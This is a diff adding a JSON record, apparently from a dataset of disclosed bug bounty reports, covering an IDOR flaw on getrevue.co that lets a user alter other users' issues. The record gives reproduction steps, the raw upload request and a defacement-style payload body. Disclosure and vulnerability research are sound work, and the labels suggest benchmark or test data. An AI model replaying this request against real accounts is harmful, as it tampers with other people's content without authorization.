@@ -1,0 +1,61 @@
+{
+    "reported_to": "X (Formerly Twitter)",
+    "reported_by": "mirhat ",
+    "title": "Ability to add arbitrary images/descriptions/titles to ohter people's issues via IDOR on getrevue.co",
+    "content": "\nSummary:\nHi team,\nI discovered a vulnerability that allows an attacker to add arbitrary images/descriptions/titles to other people's issues via IDOR\nDescription:\nIt's possible to perform a IDOR attacker on getrevue.cowhen adding a image to your issue it's also possible to add descriptions and more to other people's issue\nSteps To Reproduce:\nGo to getrevue.co and Sign In\nClick on Issues then Click on Add new issue\nGo to the Issue that you created and from the bottom of the page Click on Media\nTurn on the Intercept and Upload image\nOn the request change the ID to your other account's issue ID\nRequest:\nCode 1.09 KiB\n1POST /app/items HTTP/1.1\n2Host: www.getrevue.co\n3User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:85.0) Gecko/20100101 Firefox/85.0\n4Accept: application/json, text/javascript, */*; q=0.01\n5Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3\n6Accept-Encoding: gzip, deflate\n7Referer: https://www.getrevue.co/app/issues/current\n8X-CSRF-Token: qbWPNjfb12c1Plj7WrYDYgQFgWl2IaZr6/Qr/Vf5WyaDGyf68jn1mzx3xwtgFxBBX19RkHs/YHiREA7Ae6PGqg==\n9Content-Type: application/json\n10X-Requested-With: XMLHttpRequest\n11Content-Length: 519\n12Origin: https://www.getrevue.co\n13Connection: close\n14Cookie: [YOUR_COOKIE]\n15\n<image_0>\nPOC video:\nImpact\nAbility to add arbitrary images/descriptions/titles to other people's issues\nIt's possible to hijack other people's issues\n\n",
+    "severity": [
+        9.0,
+        10.0
+    ],
+    "bounty": null,
+    "weaknesses": [
+        "Insecure Direct Object Reference (IDOR)"
+    ],
+    "screenshots": {
+        "image_0": "{\"item_type\":\"image\",\"issue\":347976,\"id\":null,\"title\":\"Your account has been hacked\",\"url\":\"\",\"description\":\"Your account has been hacked\",\"author\":\"Your account has been hacked\",\"publication\":\"Your account has been hacked\",\"section\":\"Your account has been hacked\",\"image\":\"https://revue-direct-production.s3.amazonaws.com/cache/30fd80f79ad919f1e310aa97e0ab7940/7dc308f18b70ba627eb954d2d5376bea.png\",\"image_file_name\":\"\",\"created_at\":\"\",\"tweet_handle\":\"\",\"tweet_profile_image\":\"\",\"tweet_description\":\"\",\"tweet_lang\":\"\"}"
+    },
+    "disclosed_date": 1622080560,
+    "report_url": "https://hackerone.com/reports/1096560",
+    "vuln_category": "WEB_APP",
+    "is_multi_component": false,
+    "complexity": "LOW",
+    "novelty": "LOW",
+    "steps": [
+        [
+            1,
+            "Sign in to getrevue.co"
+        ],
+        [
+            2,
+            "Create a new issue and navigate to the 'Media' section"
+        ],
+        [
+            3,
+            "Intercept the image upload request using a proxy tool"
+        ],
+        [
+            4,
+            "Modify the issue ID in the request to target another user's issue"
+        ],
+        [
+            5,
+            "Forward the modified request to upload the image to the target issue"
+        ]
+    ],
+    "vuln_description": "An Insecure Direct Object Reference (IDOR) vulnerability allows an attacker to add arbitrary images, descriptions, and titles to other users' issues by manipulating the issue ID in the upload request.",
+    "reason": "The vulnerability involves a straightforward manipulation of a request parameter (issue ID) without requiring complex interactions or understanding of multiple components. The attack is simple to execute once the parameter to manipulate is identified.",
+    "new_complexity": "LOW",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null,
+    "idor_detectable": true,
+    "authnz_byppass_detectable": false,
+    "injection_metadata": {
+        "is_simple_payload": false
+    },
+    "authnz_metadata": {
+        "idor_detectable": true,
+        "authnz_byppass_detectable": false
+    }
+}
